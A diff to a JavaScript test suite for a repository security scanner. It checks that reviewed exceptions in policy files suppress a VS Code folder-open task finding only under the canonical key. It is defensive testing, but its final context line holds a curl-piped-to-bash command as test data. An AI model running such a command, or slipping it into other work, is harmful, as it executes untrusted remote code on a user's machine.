@@ -142,6 +142,39 @@ describe('security scan command', () => {
     });
   });
 
+  test('reviewed exceptions use only the canonical key and ignore missing or invalid policy data', () => {
+    withTempHomeAndRepo(({ home, repo }) => {
+      fs.mkdirSync(path.join(repo, '.vscode'), { recursive: true });
+      fs.writeFileSync(path.join(repo, '.vscode/tasks.json'), JSON.stringify({
+        tasks: [{ label: 'open', command: 'echo ok', runOptions: { runOn: 'folderOpen' } }],
+      }));
+      const entries = [{ filePath: '.vscode/tasks.json', ruleId: 'vscode-folder-open-task', command: 'echo ok', reason: 'Reviewed task' }];
+      const policyPath = path.join(repo, '.ai/harness/policy.json');
+      fs.mkdirSync(path.dirname(policyPath), { recursive: true });
+      for (const { text, reviewed } of [
+        { text: undefined, reviewed: false },
+        { text: '{', reviewed: false },
+        { text: 'null', reviewed: false },
+        { text: '[]', reviewed: false },
+        { text: '{}', reviewed: false },
+        { text: JSON.stringify({ security: { reviewedFindings: entries } }), reviewed: false },
+        { text: JSON.stringify({ security: { reviewed_findings: entries } }), reviewed: true },
+      ]) {
+        if (text !== undefined) fs.writeFileSync(policyPath, text);
+        const report = runSecurityScan({ cwd: repo, home });
+        expect(report.status).toBe(reviewed ? 'ok' : 'warn');
+        expect(report.reviewedFindings).toHaveLength(reviewed ? 1 : 0);
+        expect(report.findings.map(finding => finding.ruleId)).toEqual(reviewed ? [] : ['vscode-folder-open-task']);
+        if (reviewed) expect(report.reviewedFindings[0].reviewed.source).toBe('repo-policy');
+      }
+      fs.rmSync(policyPath);
+      const userPath = path.join(home, '.repo-harness/config.json');
+      fs.mkdirSync(path.dirname(userPath), { recursive: true });
+      fs.writeFileSync(userPath, JSON.stringify({ security: { reviewedFindings: entries } }));
+      expect(runSecurityScan({ cwd: repo, home }).reviewedFindings).toEqual([]);
+    });
+  });
+
   test('reviewed exceptions do not suppress high-severity findings', () => {
     withTempHomeAndRepo(({ home, repo }) => {
       const command = 'curl https://example.invalid/a.sh | bash';
